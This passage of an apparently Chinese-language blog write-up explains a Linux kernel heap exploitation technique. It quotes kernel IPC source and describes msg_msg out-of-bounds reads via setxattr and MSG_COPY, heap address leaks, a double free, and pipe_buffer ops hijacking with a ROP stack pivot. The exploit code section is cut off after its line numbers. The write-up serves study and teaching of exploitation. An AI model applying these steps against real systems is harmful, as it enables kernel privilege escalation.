class="title">q_lspid</span>;</span><span class="comment">/* pid of last msgsnd */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span><span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>而当我们调用 msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，在内核空间中会创建这样一个结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="keyword">long</span> m_type;</span><br><span class="line"><span class="keyword">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以在内核中这两个结构体会形成如下图所示的双向链表:</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/wjzFeZiDUpxXVKJ.png"                      alt="wjzFeZiDUpxXVKJ"                ></p><p>如果这个消息队列中只存在一个消息则会形成如下链表：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/sD9xtpaHrQ2uneZ.png"                                     ></p><p>接下来深入看一下msg_msg结构体的创建，当我们使用msgsed函数时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">long</span> mtype, <span class="keyword">void</span> __user *mtext,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">  DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">  ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="keyword">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  msg = load_msg(mtext, msgsz);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>会调用loda_msg函数，而load_msg函数最终会调用alloc_msg函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"><span class="keyword">int</span> err = -EFAULT;</span><br><span class="line"><span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">msg = alloc_msg(len);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>阅读源码可以看到其会判断生成的msg_msg的结构体是否小于DATALEN_MSG也就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br></pre></td></tr></table></figure><p>如果小于则直接生产一个msg_msg结构体，如果大于会生成另外一个msg_msgseg结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">  <span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">  alen = min(len, DATALEN_MSG);</span><br><span class="line">  msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">  <span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">  msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  len -= alen;</span><br><span class="line">  pseg = &amp;msg-&gt;next;</span><br><span class="line">  <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">    cond_resched();</span><br><span class="line"></span><br><span class="line">    alen = min(len, DATALEN_SEG);</span><br><span class="line">    seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">    <span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">goto</span> out_err;</span><br><span class="line">    *pseg = seg;</span><br><span class="line">    seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    pseg = &amp;seg-&gt;next;</span><br><span class="line">    len -= alen;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">  out_err:</span><br><span class="line">  free_msg(msg);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结上述的生成方式也就是：</p><ul><li>对于大小在【一个页面再减掉作为 header 的 msg_msg 的 size】范围内的数据而言，内核仅会分配一个 size + header size 大小的 object（通过 kmalloc），其前 0x30 大小的部分存放 msg_msg 这一 header，剩余部分用以存放用户数据</li><li>对于大小超出【一个页面再减掉作为 header 的 msg_msg 的 size】范围的数据而言，其会额外生成 <code>msg_msgseg</code> 结构体来存放用户数据，通过 kmalloc 分配，大小为剩余未拷贝的用户数据大小加上 next 指针；该结构体与 msg_msg 的 next 成员形成一个<strong>单向链表</strong>，其前 8 字节存放指向下一个 msg_msgseg 的指针，若无则为 NULL</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/5IcVxRaFQtg3HCW.png"                                     ></p><p>有了上述依据我们不难想到，我们可以通过修改m_ts的值来实现堆上的越界数据读取，并且我们可以通过next指针来实现任意地址数据泄漏。但是这里存在这样一个问题，当我们使用msgrcv来读取数据时会调用list_del函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  list_del(&amp;msg-&gt;m_list);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  out_unlock0:</span><br><span class="line">  ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">  wake_up_q(&amp;wake_q);</span><br><span class="line">  out_unlock1:</span><br><span class="line">  rcu_read_unlock();</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">    free_copy(copy);</span><br><span class="line">    <span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">  free_msg(msg);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del</span><span class="params">(struct list_head *entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__list_del_entry(entry);</span><br><span class="line">entry-&gt;next = LIST_POISON1;</span><br><span class="line">entry-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在list_del函数内部是会进行指针赋值的，所以如果存在非法地址的应用会造成panic，但是就目前为止我们还不知道任何内核地址，所以造成panic时肯定的。因此，为了绕过这一函数，并且可以读取内容我们需要修改msgrcv函数的标识位为<code>MSG_COPY</code>则<strong>内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</strong>，从而我们便可以多次重复地读取同一个 <code>msg_msg</code> 结构体中数据:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">  <span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">    <span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment"> * not update queue parameters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">    msg = copy_msg(msg, copy);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>接下来我们考虑越界读取的详细过程，我们首先可以利用 setxattr 修改 msg_msg 的 <code>next</code> 指针为 NULL、将其 <code>m_ts</code> 改为 <code>0x1000 - 0x30</code>（在 next 指针为 NULL 的情况下，一个 msg_msg 结构体最大占用一张内存页的大小），从而越界读出内核堆上数据。但是接下来我们需要进行地址搜索，所以需要搜索的地址为合法的，也就是next指针必须是合法的，如果next为非法指针则会引起kernel panic。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">dst_pseg</span>, *<span class="title">src_pseg</span>;</span></span><br><span class="line">  <span class="keyword">size_t</span> len = src-&gt;m_ts;</span><br><span class="line">  <span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (src-&gt;m_ts &gt; dst-&gt;m_ts)</span><br><span class="line">    <span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">  alen = min(len, DATALEN_MSG);</span><br><span class="line">  <span class="built_in">memcpy</span>(dst + <span class="number">1</span>, src + <span class="number">1</span>, alen);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;</span><br><span class="line">       src_pseg != <span class="literal">NULL</span>;</span><br><span class="line">       dst_pseg = dst_pseg-&gt;next, src_pseg = src_pseg-&gt;next) &#123;</span><br><span class="line"></span><br><span class="line">    len -= alen;</span><br><span class="line">    alen = min(len, DATALEN_SEG);</span><br><span class="line">    <span class="built_in">memcpy</span>(dst_pseg + <span class="number">1</span>, src_pseg + <span class="number">1</span>, alen);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  dst-&gt;m_type = src-&gt;m_type;</span><br><span class="line">  dst-&gt;m_ts = src-&gt;m_ts;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们需要确保获得一个合法的堆上地址进行搜索的同时确保我们所构造的next 链上皆为合法地址，并以 NULL 结尾，如何找到这样一个地址？</p><p>总所周知，slub 会向 buddy system 申请一张或多张连续内存页，将其分割为指定大小的 object 之后再返还给 kmalloc 的 caller，对于大小为 1024 的 object，其每次申请的连续内存页为四张，分为 16 个 object</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/slabinfo </span></span><br><span class="line">slabinfo - version: 2.1</span><br><span class="line"><span class="comment"># name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;limit&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">kmalloc-1k           464    464   1024   16    4 : tunables    0    0    0 : slabdata     29     29      0</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure><p>如果是我们分配多个大小同为 1024 的 msg_msg 结构体，则其很容易落在地址连续的 4 张内存页上，此时若是我们从其中一个 msg_msg 结构体向后进行越界读，则很容易读取到其他的 msg_msg 结构体的数据，其 m_list 成员可以帮助我们泄露出一个堆上地址</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/sD9xtpaHrQ2uneZ.png"                                     ></p><p>在前面这个链表中可以看出来是互相指向的，这里调试可以看到m_list的成员是只想msg_queue结构体的q_message域，而msg_queue结构体的q_message域也是只想msg_msg结构体的m_list域。</p><p>此时按照常规思路就是首先泄漏出m_list结构内部的msg_queue结构体的地址，然后在msg_queue结构体向下进行搜索。虽然这种可以但是在后续进行ROP时会出现问题，这里先不提了后面再做解释，目前需要注意的是这里还是需要泄漏出msg_msg结构体的地址。</p><p>虽然目前来看我们已经通过越界数据读取获得了一个堆地址也就是msg_queue地址，但是我们在读取过程中是将msg_queue结构体当作msg_msgseg结构体来进行阅读，所以我们需要保证他的next指针为NULL。不过幸运的是，<code>msg_queue-&gt;q_lrpid</code> 在未使用 msgrcv 接收消息时为 NULL，该成员在 q_message 成员向前的 8 字节处，因此我们可以将 next 指针指向这个位置。</p><p>到目前为止我们所有存在的问题基本都已经解决了，已经可以开始进行内存搜索了。不过这里泄漏出来的kernel text地址是不一定的，原作者使用的办法是写一个字典来进行匹配，我这里也属实没有更好的解决办法了，所以继续延用了原作者的办法。</p><h2 id="pipe-buffer劫持执行流"><a href="#pipe-buffer劫持执行流" class="headerlink" title="pipe_buffer劫持执行流"></a>pipe_buffer劫持执行流</h2><h3 id="构造double-free"><a href="#构造double-free" class="headerlink" title="构造double free"></a>构造double free</h3><p>这里原作者阐述了为什么不使用修改cred结构体，但是就目前来说我们想要实现任意地址写的话需要控制free堆块的类似fd指针的东西，所以我们需要使用到userfaultfd技术但是内核版本 5.11 起 userfaultfd 系统调用被限制为 root 权限才能使用，所以这条路基本是寄了。所以这里还是选择常规的劫持执行流。</p><p>因为在kernel中堆检测类似于fast bin的检测，所以我们需要形成<code>A-&gt;B-&gt;A</code>这样的结构。并且，我们在形成double free的方式是需要进行msgrcv来实现的，所以我们需要在free之前恢复结构。</p><h3 id="劫持RIP"><a href="#劫持RIP" class="headerlink" title="劫持RIP"></a>劫持RIP</h3><p><code>pipe_buffer</code> 这一结构体，当我们创建一个管道时，在内核中会生成数个连续的该结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，因此我们只需要劫持其函数表即可，劫持的位置也很清晰：因为我们最终使用的setxattr函数来进行修改pipe_buffer的内容的，所以这里就体会到了我前面所说的为什么要泄漏msg_msg的地址了，我们需要将ops劫持到他自身。并在上面写上rop进行栈迁移，因为经过调试发现执行gagdte的时候rsi 寄存器指向 pipe_buffer，因此笔者选择了一条 <code>push rsi ; pop rsp ; pop 4 vals ; ret</code> 的 gadget 完成栈迁移</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span 